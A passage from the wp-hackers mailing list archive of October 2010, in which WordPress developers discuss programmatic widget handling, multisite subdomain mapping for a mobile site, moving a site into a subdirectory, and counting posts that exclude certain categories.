> - check if all the widgets used on the sidebar to import are available on the destination
> - reset the sidebar's widgets in $sidebars_widgets - I'm not going to delete the old widgets as I fear this could turn out in a mess
> - iterate over the new to assign widgets. The numeric value that identifies the instance is get from an internal array that initializes with the value of $wp_widget_factory->widget[ $widget_class ]->number and then gets incremented internally.
> - push the widget's settings into the unserialized value of option widget_$id_base also gotten from $wp_widget_factory and update the option.
> - once all widgets for the sidebar are done, I update the sidebars_widgets option and go over to the next sidebar.
> 
> I'm not sure if I covered all ends and if there's a simpler way of doing this. I also fear that this solution might break in a future version of WordPress. What do you think?


It sounds like what you need is a comprehensive widget management api!

The best way to get this is to work through the current widget code in wp-admin/widgets.php and try and abstract it out into an api which that code can use and your plugin can use.

Submit this as a core patch and once it is included you will have an api to base your plugin on.

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From wes.club at gmail.com  Tue Oct 19 10:35:25 2010
From: wes.club at gmail.com (wissem riahi)
Date: Tue, 19 Oct 2010 12:35:25 +0200
Subject: [wp-hackers] copying a wordpress sites .
Message-ID: <AANLkTi=reHOaXaukDqAmzG9bP-SnF5jHNOtKAfmw9NVe@mail.gmail.com>

Hello
i want to copy a website into a subdirectory , so i copied all files from
the root folder / into /french for exemple (with the same database,config
etc) but when i try to login into the admin panel of the new copied sitei
can't login even if the connection infos are correct !!


-- 

wissem-riahi.com
linux-tn.com

Follow me on Twitter:
http://twitter.com/WicemRiahi

From hempsworth at gmail.com  Tue Oct 19 11:03:13 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Tue, 19 Oct 2010 12:03:13 +0100
Subject: [wp-hackers] copying a wordpress sites .
In-Reply-To: <AANLkTi=reHOaXaukDqAmzG9bP-SnF5jHNOtKAfmw9NVe@mail.gmail.com>
References: <AANLkTi=reHOaXaukDqAmzG9bP-SnF5jHNOtKAfmw9NVe@mail.gmail.com>
Message-ID: <AANLkTim26DSUNf8QqF4eAsh3fY39fgLuEk5h6SYwy5mA@mail.gmail.com>

Please use the support forums for questions like this in the future:
http://wordpress.org/support/

But, there is a Codex article that may be useful:
http://codex.wordpress.org/Moving_WordPress

-- Alex


On Tue, Oct 19, 2010 at 11:35 AM, wissem riahi <wes.club at gmail.com> wrote:

> Hello
> i want to copy a website into a subdirectory , so i copied all files from
> the root folder / into /french for exemple (with the same database,config
> etc) but when i try to login into the admin panel of the new copied sitei
> can't login even if the connection infos are correct !!
>
>
> --
>
> wissem-riahi.com
> linux-tn.com
>
> Follow me on Twitter:
> http://twitter.com/WicemRiahi
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From rbilesky at gmail.com  Tue Oct 19 23:35:53 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 19 Oct 2010 16:35:53 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
Message-ID: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>

I am looking to have 2 WP powered sites.  mysite.com (as a CMS) and
blog.mysite.com (as a blog, obviously).  Now I opted to setup multisite
since thats the easy way to do this.  However I have a small issue.  Instead
of a wildcard subdomain entry I just created a dns entry for blog.mysite.com,
but I also have pointed m.mysite,com to mysite as well to display a mobile
version of mysite.  Since m.mysite.com isn;t setup as a seperate blog it
shows the registeration page.  Is anyone aware of a way wherew I can have
wordpress treat m.mysite.com like mysite.com.  Then I have a plugin that
will detect the m.mysite.com url and override the theme with a mobile theme.

If this is not possible if I specifically create a site m.mysite.com can I
have it pull the contents from the tables for mysite.com with a plugin or
something.

From rbilesky at gmail.com  Tue Oct 19 23:58:31 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 19 Oct 2010 16:58:31 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
Message-ID: <AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>

I'm thinking the most elegant way to deal with this might be to setup a
site for m.mysite.com in multisite and use either the mobile theme's
function.php or a plugin to have it pull posts and comments, ect from
wp_table rather than wp_#_table.  Is there by chance a generic sql filter
that will afford me the ability to filter an sql query before its executed?
If not what are my options to have a blog pull posts and stuff from another
blogs table in multisite.

On Tue, Oct 19, 2010 at 4:35 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> I am looking to have 2 WP powered sites.  mysite.com (as a CMS) and
> blog.mysite.com (as a blog, obviously).  Now I opted to setup multisite
> since thats the easy way to do this.  However I have a small issue.  Instead
> of a wildcard subdomain entry I just created a dns entry for
> blog.mysite.com, but I also have pointed m.mysite,com to mysite as well to
> display a mobile version of mysite.  Since m.mysite.com isn;t setup as a
> seperate blog it shows the registeration page.  Is anyone aware of a way
> wherew I can have wordpress treat m.mysite.com like mysite.com.  Then I
> have a plugin that will detect the m.mysite.com url and override the theme
> with a mobile theme.
>
> If this is not possible if I specifically create a site m.mysite.com can I
> have it pull the contents from the tables for mysite.com with a plugin or
> something.
>

From Martin.Widmann at medienhaus.com  Wed Oct 20 05:54:09 2010
From: Martin.Widmann at medienhaus.com (Martin Widmann)
Date: Wed, 20 Oct 2010 05:54:09 +0000
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
Message-ID: <40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>

While sharing contents across multiple blogs on the same site is pretty easy - just hook into pre_get_posts, switch_to_blog( $content_blog_id ) and in the the_posts filter, restore_current_blog() - it's not so easy in other situations..

Why don't you just use the WordPress MU Domain Mapping Plugin? http://wordpress.org/extend/plugins/wordpress-mu-domain-mapping/ Should do exactly what you need.

BR
Martin

On Oct 20, 2010, at 1:58 , Ryan Bilesky wrote:

> I'm thinking the most elegant way to deal with this might be to setup a
> site for m.mysite.com in multisite and use either the mobile theme's
> function.php or a plugin to have it pull posts and comments, ect from
> wp_table rather than wp_#_table.  Is there by chance a generic sql filter
> that will afford me the ability to filter an sql query before its executed?
> If not what are my options to have a blog pull posts and stuff from another
> blogs table in multisite.
> 
> On Tue, Oct 19, 2010 at 4:35 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> 
>> I am looking to have 2 WP powered sites.  mysite.com (as a CMS) and
>> blog.mysite.com (as a blog, obviously).  Now I opted to setup multisite
>> since thats the easy way to do this.  However I have a small issue.  Instead
>> of a wildcard subdomain entry I just created a dns entry for
>> blog.mysite.com, but I also have pointed m.mysite,com to mysite as well to
>> display a mobile version of mysite.  Since m.mysite.com isn;t setup as a
>> seperate blog it shows the registeration page.  Is anyone aware of a way
>> wherew I can have wordpress treat m.mysite.com like mysite.com.  Then I
>> have a plugin that will detect the m.mysite.com url and override the theme
>> with a mobile theme.
>> 
>> If this is not possible if I specifically create a site m.mysite.com can I
>> have it pull the contents from the tables for mysite.com with a plugin or
>> something.
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From Martin.Widmann at medienhaus.com  Wed Oct 20 05:55:35 2010
From: Martin.Widmann at medienhaus.com (Martin Widmann)
Date: Wed, 20 Oct 2010 05:55:35 +0000
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
	<94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
Message-ID: <E1214035-7B8A-498E-A67E-71FB724DCBB8@medienhaus.at>

Hi Peter,

that's exactly what I will be doing. For now my implementation works fine, but it's not very elegant. 

BR
Martin

On Oct 19, 2010, at 11:04 , Peter Westwood wrote:

> Hi Martin,
> 
> On 19 Oct 2010, at 07:31, Martin Widmann wrote:
> 
>> I'm currently working on an extension to the widget's functionality to allow users of the site to create virtually unlimited amounts of new sidebars, filter them and add widgets to them. As long as it's sidebars it's pretty straight forward. 
>> 
>> - register Sidebar
>> - Store sidebar settings in options
>> - when init fires, re-create the stored sidebars 
>> 
>> Having many sidebars in many configurations calls for an import/export functionality. And this is where it gets tricky. I haven't found a good way of adding/removing widgets programmatically. It all seems to get done via rewriting parameters in the POST and than calling back various methods on WP_Widget. Trying to reverse engineer this functionality added the widgets to the database in some "invisible" space, but not to the sidebar I wanted.
>> 
>> Therefore I decided to go the hard way and do the operations on the simple serialized arrays stored in the database:
>> 
>> - sidebars can either be overwritten or not if they exist on destination
>> - check if all the widgets used on the sidebar to import are available on the destination
>> - reset the sidebar's widgets in $sidebars_widgets - I'm not going to delete the old widgets as I fear this could turn out in a mess
>> - iterate over the new to assign widgets. The numeric value that identifies the instance is get from an internal array that initializes with the value of $wp_widget_factory->widget[ $widget_class ]->number and then gets incremented internally.
>> - push the widget's settings into the unserialized value of option widget_$id_base also gotten from $wp_widget_factory and update the option.
>> - once all widgets for the sidebar are done, I update the sidebars_widgets option and go over to the next sidebar.
>> 
>> I'm not sure if I covered all ends and if there's a simpler way of doing this. I also fear that this solution might break in a future version of WordPress. What do you think?
> 
> 
> It sounds like what you need is a comprehensive widget management api!
> 
> The best way to get this is to work through the current widget code in wp-admin/widgets.php and try and abstract it out into an api which that code can use and your plugin can use.
> 
> Submit this as a core patch and once it is included you will have an api to base your plugin on.
> 
> Cheers
> -- 
> Peter Westwood
> http://blog.ftwr.co.uk | http://westi.wordpress.com
> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From rbilesky at gmail.com  Wed Oct 20 06:56:03 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Tue, 19 Oct 2010 23:56:03 -0700
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
Message-ID: <AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>

That plugin doesn't quite do what I need.  As far as the way to share the
contents across blogs, aren't we supposed to not use switch_to_blog because
of performance reasons or has that been fixed.


On Tue, Oct 19, 2010 at 10:54 PM, Martin Widmann <
Martin.Widmann at medienhaus.com> wrote:

> While sharing contents across multiple blogs on the same site is pretty
> easy - just hook into pre_get_posts, switch_to_blog( $content_blog_id ) and
> in the the_posts filter, restore_current_blog() - it's not so easy in other
> situations..
>
> Why don't you just use the WordPress MU Domain Mapping Plugin?
> http://wordpress.org/extend/plugins/wordpress-mu-domain-mapping/ Should do
> exactly what you need.
>
> BR
> Martin
>
> On Oct 20, 2010, at 1:58 , Ryan Bilesky wrote:
>
> > I'm thinking the most elegant way to deal with this might be to setup a
> > site for m.mysite.com in multisite and use either the mobile theme's
> > function.php or a plugin to have it pull posts and comments, ect from
> > wp_table rather than wp_#_table.  Is there by chance a generic sql filter
> > that will afford me the ability to filter an sql query before its
> executed?
> > If not what are my options to have a blog pull posts and stuff from
> another
> > blogs table in multisite.
> >
> > On Tue, Oct 19, 2010 at 4:35 PM, Ryan Bilesky <rbilesky at gmail.com>
> wrote:
> >
> >> I am looking to have 2 WP powered sites.  mysite.com (as a CMS) and
> >> blog.mysite.com (as a blog, obviously).  Now I opted to setup multisite
> >> since thats the easy way to do this.  However I have a small issue.
>  Instead
> >> of a wildcard subdomain entry I just created a dns entry for
> >> blog.mysite.com, but I also have pointed m.mysite,com to mysite as well
> to
> >> display a mobile version of mysite.  Since m.mysite.com isn;t setup as
> a
> >> seperate blog it shows the registeration page.  Is anyone aware of a way
> >> wherew I can have wordpress treat m.mysite.com like mysite.com.  Then I
> >> have a plugin that will detect the m.mysite.com url and override the
> theme
> >> with a mobile theme.
> >>
> >> If this is not possible if I specifically create a site m.mysite.comcan I
> >> have it pull the contents from the tables for mysite.com with a plugin
> or
> >> something.
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mail at scribu.net  Wed Oct 20 09:34:39 2010
From: mail at scribu.net (scribu)
Date: Wed, 20 Oct 2010 12:34:39 +0300
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
Message-ID: <AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>

On Wednesday, October 20, 2010, Ryan Bilesky <rbilesky at gmail.com> wrote:
> As far as the way to share the
> contents across blogs, aren't we supposed to not use switch_to_blog because
> of performance reasons or.

Where did you read that?

-- 
http://scribu.net

From wp at andrewnacin.com  Wed Oct 20 10:53:01 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 20 Oct 2010 06:53:01 -0400
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
Message-ID: <AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>

On Wed, Oct 20, 2010 at 5:34 AM, scribu <mail at scribu.net> wrote:

> On Wednesday, October 20, 2010, Ryan Bilesky <rbilesky at gmail.com> wrote:
> > As far as the way to share the
> > contents across blogs, aren't we supposed to not use switch_to_blog
> because
> > of performance reasons or.
>
> Where did you read that?


'Tis true, switch_to_blog() should generally be avoided wherever possible.
It will be necessary from time to time, however.

It sounds to me like you just want m.example.com to serve up
example.comjust another theme, yes? In that case, you just need a
little logic
somewhere (not much different than how many mobile plugins do this) to tell
WordPress to interpret m.example.com as example.com, just with a different
theme.

From hempsworth at gmail.com  Wed Oct 20 10:56:23 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Wed, 20 Oct 2010 11:56:23 +0100
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
Message-ID: <AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>

I've tried this before and it's difficult with multi-site set up.

I guess the question is, how do we 'jump in' before WordPress serves up the
registration page at m.example.com and instead serve up example.com with a
different theme?

Because, once we set up subdomain wildcards, WP is running the show then?

-- Alex


On Wed, Oct 20, 2010 at 11:53 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Wed, Oct 20, 2010 at 5:34 AM, scribu <mail at scribu.net> wrote:
>
> > On Wednesday, October 20, 2010, Ryan Bilesky <rbilesky at gmail.com> wrote:
> > > As far as the way to share the
> > > contents across blogs, aren't we supposed to not use switch_to_blog
> > because
> > > of performance reasons or.
> >
> > Where did you read that?
>
>
> 'Tis true, switch_to_blog() should generally be avoided wherever possible.
> It will be necessary from time to time, however.
>
> It sounds to me like you just want m.example.com to serve up
> example.comjust another theme, yes? In that case, you just need a
> little logic
> somewhere (not much different than how many mobile plugins do this) to tell
> WordPress to interpret m.example.com as example.com, just with a different
> theme.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Wed Oct 20 11:25:46 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed, 20 Oct 2010 12:25:46 +0100
Subject: [wp-hackers] Multisite w/ Subdomain issues
In-Reply-To: <AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
References: <AANLkTimAY5rwBGqmZsmdbr7BF+FA+QHiOSGnaAVGeBuP@mail.gmail.com>
	<AANLkTim3DKzkuxyjBJYa3dY6oxrBCVRWZQvu904JUG+y@mail.gmail.com>
	<40018148-A080-4F21-A7D8-5F0EFA1B1711@medienhaus.at>
	<AANLkTinSpZ367=HtAwi5wp7+P_m+zPaJEtcYPwjis4ZF@mail.gmail.com>
	<AANLkTikBF27QuL+Jya3ozqtbYUTfkPqYLi-=nQvzpKM8@mail.gmail.com>
	<AANLkTimrssvs4LHdbPFFK0mexNSOt82UDJuq6SnDcMOi@mail.gmail.com>
	<AANLkTinG1Vw3FFCfVGbz=UTQuonU2K9qw=CaoWQTWX+z@mail.gmail.com>
Message-ID: <A8051D18-0D79-472C-8520-8C3A81AA675C@ftwr.co.uk>


On 20 Oct 2010, at 11:56, Alex Hempton-Smith wrote:

> I've tried this before and it's difficult with multi-site set up.
> 
> I guess the question is, how do we 'jump in' before WordPress serves up the
> registration page at m.example.com and instead serve up example.com with a
> different theme?
> 
> Because, once we set up subdomain wildcards, WP is running the show then?
> 
> 

I guess the answer would be to put some code in sunrise.php to make WP believe that the current blog is the one you want it to in this case and make it use the right theme

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From richzenmaster at gmail.com  Wed Oct 20 11:53:13 2010
From: richzenmaster at gmail.com (Rich ZenMaster)
Date: Wed, 20 Oct 2010 04:53:13 -0700
Subject: [wp-hackers] get total of posts NOT in selected categories
Message-ID: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>

Hi,

I need to get the total number of posts that are not in selected categories.

I have category IDs of the categories that I want to exclude from count (in
the variable $folio_cat_ids)

So far I have this code which is not working,

$numposts = $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->posts WHERE
post_status = 'publish' AND post_type = 'post' AND post_name NOT LIKE
'%revision%' AND post_name NOT LIKE '%autosave%' AND post_category NOT
IN($folio_cat_ids)");

Please help.

From richzenmaster at gmail.com  Wed Oct 20 11:53:58 2010
From: richzenmaster at gmail.com (Rich ZenMaster)
Date: Wed, 20 Oct 2010 04:53:58 -0700
Subject: [wp-hackers] making shortcodes work in theme options
Message-ID: <AANLkTik71WJZeNmNTYMmY92TH07tvUY5t=GnHSDOENE6@mail.gmail.com>

Is it possible to make the shortcodes work in theme options?

From wp at andrewnacin.com  Wed Oct 20 12:12:20 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 20 Oct 2010 08:12:20 -0400
Subject: [wp-hackers] get total of posts NOT in selected categories
In-Reply-To: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
References: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
Message-ID: <AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>

On Wed, Oct 20, 2010 at 7:53 AM, Rich ZenMaster <richzenmaster at gmail.com>wrote:

> Hi,
>
> I need to get the total number of posts that are not in selected
> categories.
>
> I have category IDs of the categories that I want to exclude from count (in
> the variable $folio_cat_ids)
>

Avoid direct queries where possible, unless you're caching them.

To retrieve a list of posts and avoid a certain category, check out
WP_Query, http://codex.wordpress.org/Function_Reference/WP_Query, or
get_posts().

Then check out the category__not_in query var.

From richzenmaster at gmail.com  Wed Oct 20 12:26:24 2010
From: richzenmaster at gmail.com (Rich ZenMaster)
Date: Wed, 20 Oct 2010 05:26:24 -0700
Subject: [wp-hackers] get total of posts NOT in selected categories
In-Reply-To: <AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>
References: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
	<AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>
Message-ID: <AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>

Actually I don't need the list of posts. Just the post count.

On Wed, Oct 20, 2010 at 5:12 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Wed, Oct 20, 2010 at 7:53 AM, Rich ZenMaster <richzenmaster at gmail.com
> >wrote:
>
> > Hi,
> >
> > I need to get the total number of posts that are not in selected
> > categories.
> >
> > I have category IDs of the categories that I want to exclude from count
> (in
> > the variable $folio_cat_ids)
> >
>
> Avoid direct queries where possible, unless you're caching them.
>
> To retrieve a list of posts and avoid a certain category, check out
> WP_Query, http://codex.wordpress.org/Function_Reference/WP_Query, or
> get_posts().
>
> Then check out the category__not_in query var.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From yojoaquin at gmail.com  Wed Oct 20 13:46:58 2010
From: yojoaquin at gmail.com (Joaquin Rodriguez Montero)
Date: Wed, 20 Oct 2010 10:46:58 -0300
Subject: [wp-hackers] Query Child Taxonomies dynamically
Message-ID: <AANLkTi=C-BZG8owkjO2g6_RtcNC=1raro9SHPr9768oR@mail.gmail.com>

Hi guys,

This is the scenario: I've three custom taxonomy's levels:
>Family

>>Mother-1
>>>Son-1
>>>Daughter-1

>>Mother-2
>>>Son-2
>>>Daughter-2

>Mother
>Son
>Daughter

etc.

I'm wondering how can I query *dynamically* the child taxonomies of the
bottom/*oldest* category.. meaning if I have a Post in: Family, Mother,
Mother-1, how can I query posts in Son-1 and Daughter-1 (which belong to
Mother-1)?

Any idea?

Cheers,

J

From johnbillion+wp at gmail.com  Wed Oct 20 14:23:05 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Wed, 20 Oct 2010 15:23:05 +0100
Subject: [wp-hackers] get total of posts NOT in selected categories
In-Reply-To: <AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>
References: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
	<AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>
	<AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>
Message-ID: <AANLkTinm0Pse5-+fx2U=mkEB8fZ7T1ziZZOGQn4foMKg@mail.gmail.com>

On Wed, Oct 20, 2010 at 1:26 PM, Rich ZenMaster <richzenmaster at gmail.com> wrote:
> Actually I don't need the list of posts. Just the post count.

If you fetch the posts using get_posts() as Andrew suggested you can
then count() them to get the total. The added bonus will be that the
posts are added to WordPress' object cache.

From wp at andrewnacin.com  Wed Oct 20 14:29:13 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 20 Oct 2010 10:29:13 -0400
Subject: [wp-hackers] get total of posts NOT in selected categories
In-Reply-To: <AANLkTinm0Pse5-+fx2U=mkEB8fZ7T1ziZZOGQn4foMKg@mail.gmail.com>
References: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
	<AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>
	<AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>
	<AANLkTinm0Pse5-+fx2U=mkEB8fZ7T1ziZZOGQn4foMKg@mail.gmail.com>
Message-ID: <AANLkTinhCXjcCBCsCR7eZRH7YBsAAo5ts_9KycHvMeRQ@mail.gmail.com>

On Wed, Oct 20, 2010 at 10:23 AM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> On Wed, Oct 20, 2010 at 1:26 PM, Rich ZenMaster <richzenmaster at gmail.com>
> wrote:
> > Actually I don't need the list of posts. Just the post count.
>
> If you fetch the posts using get_posts() as Andrew suggested you can
> then count() them to get the total. The added bonus will be that the
> posts are added to WordPress' object cache.


Especially important if you then need to display these posts.

If you use WP_Query directly, you can use $my_query->post_count.

From johnbillion+wp at gmail.com  Wed Oct 20 14:23:05 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Wed, 20 Oct 2010 15:23:05 +0100
Subject: [wp-hackers] get total of posts NOT in selected categories
In-Reply-To: <AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>
References: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
	<AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>
	<AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>
Message-ID: <AANLkTinm0Pse5-+fx2U=mkEB8fZ7T1ziZZOGQn4foMKg@mail.gmail.com>

On Wed, Oct 20, 2010 at 1:26 PM, Rich ZenMaster <richzenmaster at gmail.com> wrote:
> Actually I don't need the list of posts. Just the post count.

If you fetch the posts using get_posts() as Andrew suggested you can
then count() them to get the total. The added bonus will be that the
posts are added to WordPress' object cache.

From jer at simianuprising.com  Wed Oct 20 15:48:04 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Wed, 20 Oct 2010 11:48:04 -0400
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
	<94598DE2-E081-47B5-8B7C-DF504F522814@ftwr.co.uk>
Message-ID: <AANLkTinxp1FYMQRrvDgFh_pw=eq_5HNBNrVfEpX0V2zS@mail.gmail.com>

On Tue, Oct 19, 2010 at 5:04 AM, Peter Westwood
<peter.westwood at ftwr.co.uk>wrote:

> It sounds like what you need is a comprehensive widget management api!
>
> The best way to get this is to work through the current widget code in
> wp-admin/widgets.php and try and abstract it out into an api which that code
> can use and your plugin can use.
>
> Submit this as a core patch and once it is included you will have an api to
> base your plugin on.
>
>
+1

WP needs this badly. Among other automation-related uses it would be great
if themes could define initial widgets for their widget zones in
functions.php rather than having hard-coded alternate content (which
confuses users who go to Appearance > Widgets and see nothing there to
explain what's already visible on the site).

-- 
Jeremy Clarke
Code and Design | globalvoicesonline.org

From ashishsainiashfame at gmail.com  Wed Oct 20 15:51:03 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Wed, 20 Oct 2010 21:21:03 +0530
Subject: [wp-hackers] get total of posts NOT in selected categories
In-Reply-To: <AANLkTinhCXjcCBCsCR7eZRH7YBsAAo5ts_9KycHvMeRQ@mail.gmail.com>
References: <AANLkTikm0uORKtwRsPNn5LZC2kmebpCY0GFo3j5TqnJD@mail.gmail.com>
	<AANLkTi=5HdcpMp64WiumiT1Stk-vTCVfLvoZ7nNkxtw7@mail.gmail.com>
	<AANLkTi=jPmmt=C6uUPJeX5qAQFp_zPHa5OnJXZyM8pP4@mail.gmail.com>
	<AANLkTinm0Pse5-+fx2U=mkEB8fZ7T1ziZZOGQn4foMKg@mail.gmail.com>
	<AANLkTinhCXjcCBCsCR7eZRH7YBsAAo5ts_9KycHvMeRQ@mail.gmail.com>
Message-ID: <AANLkTikb4um6FE9GAsdnUDy3jYh9aKC4Q592U8AAG4R4@mail.gmail.com>

@Andrew
Codex says - The get_var function returns a single variable from the
database. Though only one variable is returned, the entire result of the
query is cached for later use.

So what is not being cached?

